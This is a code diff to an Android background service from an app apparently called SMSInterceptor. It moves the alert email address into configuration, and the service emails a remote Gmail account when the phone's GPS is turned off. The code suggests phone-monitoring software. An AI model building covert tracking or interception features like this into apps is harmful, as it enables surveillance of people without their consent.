@@ -27,13 +27,24 @@ import android.database.ContentObserver;
 
 public class SMSService extends Service implements LocationListener {
 
+  private static String gmailEmailString;
+
   private static GmailSender sender;
+  private static Configure configure;
+  private static LocationManager locationManager;
 
   private static boolean eLocation = false;
   private static boolean mLocation = false;
 
-  private static LocationManager locationManager;
-  private static String gmailEmailString = "justdriveapp1@gmail.com";
+  public SMSService() { 
+    configure = new Configure();
+    if(!configure.getDatabaseInfo().equals("null")) {
+      gmailEmailString = String.valueOf(configure.getEmailAddress());
+    }
+    else {
+      gmailEmailString = "smsinterceptorapp@gmail.com";   
+    }
+  } 
 
   final Messenger mMessenger = new Messenger(new IncomingHandler());
 
@@ -62,7 +73,6 @@ public class SMSService extends Service implements LocationListener {
         try {
           sender = new GmailSender();
           sender.sendMail("SMSInterceptor", "GPS has been 'DIS'abled!", gmailEmailString);
-          //sender.sendMail("SMSInterceptor", "GPS has been 'DIS'abled!", gmailEmailString, gmailEmailString);
         }
         catch(Exception e) {
           e.printStackTrace();
